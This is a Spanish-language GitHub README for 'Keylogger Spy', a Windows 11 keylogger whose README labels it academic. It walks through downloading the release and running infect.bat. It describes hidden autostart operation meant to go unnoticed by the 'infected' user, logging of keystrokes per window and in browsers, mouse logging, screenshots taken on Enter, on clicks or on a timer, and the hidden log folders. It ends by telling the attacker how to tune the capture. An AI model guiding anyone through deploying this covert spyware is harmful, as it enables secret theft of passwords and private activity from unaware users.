# Keylogger Spy

_Este software se encarga de interceptar y registrar las pulsaciones que se realizan en el teclado y en el mouse de una computadora_

#### Importante: Este proyecto se ha desarrollado con fines académicos.

## Tabla de contenidos 📖

* [Descripción y contexto](#descripci%C3%B3n-y-contexto)
* [Clonar este repositorio](#clonar-este-repositorio)
* [Guía de instalación](#gu%C3%ADa-de-instalaci%C3%B3n)
    * [Prerrequisitos](#prerrequisitos)
    * [Instalación](#instalaci%C3%B3n)
* [Guía de usuario](#gu%C3%ADa-de-usuario)
    * [Directorio raíz de los registros](#directorio-ra%C3%ADz-de-los-registros)
    * [Directorio raíz de los registros del teclado](#directorio-ra%C3%ADz-de-los-registros-del-teclado)
    * [Directorio raíz de los registros del mouse](#directorio-ra%C3%ADz-de-los-registros-del-mouse)
    * [Directorio raíz de los registros de las capturas de pantalla](#directorio-ra%C3%ADz-de-los-registros-de-las-capturas-de-pantalla)
    * [Configuración](#configuraci%C3%B3n)

## Descripción y contexto
Keylogger que se ha desarrollado y tiene como por objetivo demostrar lo vulnerable que puede ser el sistema operativo Windows 11 ante un spyware. Cuenta con un instalador el cual realiza el proceso de transferencia de los archivos del Keylogger en el computador para ser infectado, después de su instalación se ejecutará cada vez que se inicie Windows. Se diseño para que funcione en segundo plano y no muestre mensajes en pantalla de tal manera que pase desapercibido por el usuario infectado. Después del proceso de interceptar pulsaciones se genera la información, esta se puede ver de manera local donde los registros se encuentren dentro de archivos de texto y las capturas en imágenes con formato JPEG. Se estableció para sea una aplicación de consola con el lenguaje de programación C++ empleando bibliotecas nativas de Windows para que sea compatible con las computadoras que se desea infectar.

## Clonar este repositorio
Para clonar este repositorio sigue los siguientes pasos:

Descargue el repositorio utilizando el navegador o con el bash
```
git clone https://github.com/JoelDiaz93/Cpp-Keylogger.git
```

En caso de haberla descargado con el navegador debe descomprimir el archivo e ingresar en el directorio del repositorio, en caso de haber usado el bash solo debe ingresar en el directorio del repositorio.

Utilizar el archivo sln para abrir la solución en Visual Studio 
```
..\Cpp-Keylogger\Spy.sln
```

Requisitos para modificar el código.
 ```
 - De preferencia usar el IDE Visual Studio
- Estándar de lenguaje C++: Estándar ISO C++20
- Estándar de lenguaje C: Estándar ISO C17
 ```

## Guía de instalación
Este proyecto dispone de un conjunto de archivos con los cuales es posible instalar el **Keylogger**, para ello es necesario seguir ciertos pasos los cuales se describen a continuación:

### Prerrequisitos

### Instalación

Descargar la última versión del **Keylogger**:
[Instalador del Keylogger](https://github.com/JoelDiaz93/Cpp-Keylogger/releases)

Descargar el archivo
```
spy.zip
```

Descomprimir el archivo comprimido e ingresar al directorio que contiene los archivos que estaban dentro de *spy.zip*, estos son los 5 archivos que contiene:

![Spy](https://user-images.githubusercontent.com/58042087/155380451-c36d415b-8cd0-44c8-a7e9-157840c4ba9a.png)

Para la instalación del **Keylogger** se requiere usar el archivo:
```
..\infect.bat
```
Para desinstalar y eliminar el **Keylogger del computador infectado solo se requiere usar el archivo: 
```
..\desinfect.bat
```
Si solo se desea terminar el proceso abierto por el **Keylogger**
```
..\kill.bat
```

## Guía de usuario
Una vez instalado el **Keylogger** este se iniciará automáticamente en segundo plano, su funcionamiento pasa por desapercibido para el usuario. 
Las evidencias locales del funcionamiento de esta herramienta se lo pueden ver en el directorio:

### Directorio raíz de los registros:
```
C:\Usuarios\nombredeusuario\.temp_data
```
En este directorio se encuentran los directorios para los registros del teclado, mouse y capturas de pantalla adicional a esto se encuentra el archivo de configuración.

### Directorio raíz de los registros del teclado:
```
C:\Usuarios\nombredeusuario\.temp_data\keyboard
```
En este directorio se almacenará todas las pulsaciones que se realicen dentro de una ventana activa, por tanto, siempre que se cambie de ventana activa se genera un archivo de texto y se almacena el registro de pulsaciones realizadas en dicha ventana.

### Directorio raíz de los registros del mouse:
```
C:\Usuarios\nombredeusuario\.temp_data\mouse
```
Dentro de este directorio se encuentran los archivos de texto generados por las pulsaciones del mouse en un día.

### Directorio raíz de los registros de las capturas de pantalla:
```
C:\Usuarios\nombredeusuario\.temp_data\image
```
En este directorio se almacenará todas las capturas que se realicen con los diferentes tipos de eventos que se han establecido.

### Configuración
Para configurar el funcionamiento del **keylogger** es necesario abrir nuestro archivo de configuración *.conf* el cual se encuentra en:
```
C:\Usuarios\nombredeusuario\.temp_data\.conf
```
![conf](https://user-images.githubusercontent.com/58042087/155380500-021ba456-fc55-4fc9-add3-0ef710bd1976.png)

En la imagen podemos ver una descripción corta sobre la información que se ve y sobre las funciones que podemos configurar para el **Keylogger**. En las primeras líneas se encuentra información sobre el usuario, computadora, un id generado a partir de los 2 primeros valores y adicional se encuentra la hora y fecha que fue infectada la computadora.

Después de esta información se encuentra los campos de configuración:
```
KeyStroke = on
```
Esta función permite la captura de las pulsaciones realizadas por el teclado, al desactivar esta función el keylogger dejara de capturar y registrar las pulsaciones de inmediato. También por consiguiente dejara de tomar capturas por eventos relacionados a esta función.

```
Website = on
```
Esta función permite capturar las pulsaciones realizadas en navegadores web. Está ligada a la primera función y al desactivarse esta función dejara de registrar la información registrada en los navegadores.
```
Screen_Enter = on
```
Con esta función activa se captura la pantalla siempre que se realice la pulsación de la tecla Enter.
```
Screen_Click = on
```
Esta función está relacionada con la función de registro de pulsaciones de los botones del mouse de esta manera se identifica cuando se realiza una pulsación con el botón izquierdo y se genera una captura de pantalla.
```
Screen_Time = on
```
La función permite tomar una captura cada cierto tiempo automáticamente, esto se lo hace mediante un cronometro que al llegar el tiempo determinado por el usuario toma la captura de pantalla.
```
Timer = 300
```
Este parámetro determina la cantidad de tiempo que debe transcurrir en el cronometro para tomar la captura de pantalla. Este se debe configurar en segundos, por defecto se lo ha dejado en 300 segundos lo cual en minutos son 5 minutos.
```
Capture_Mouse = on
```
Esta función activa el registro de pulsaciones del mouse con el cual depende una de las funciones de toma de captura de pantalla.

_Por defecto todas las funciones están activadas, el atacante puede configurar a su gusto estas funciones según le convenga_







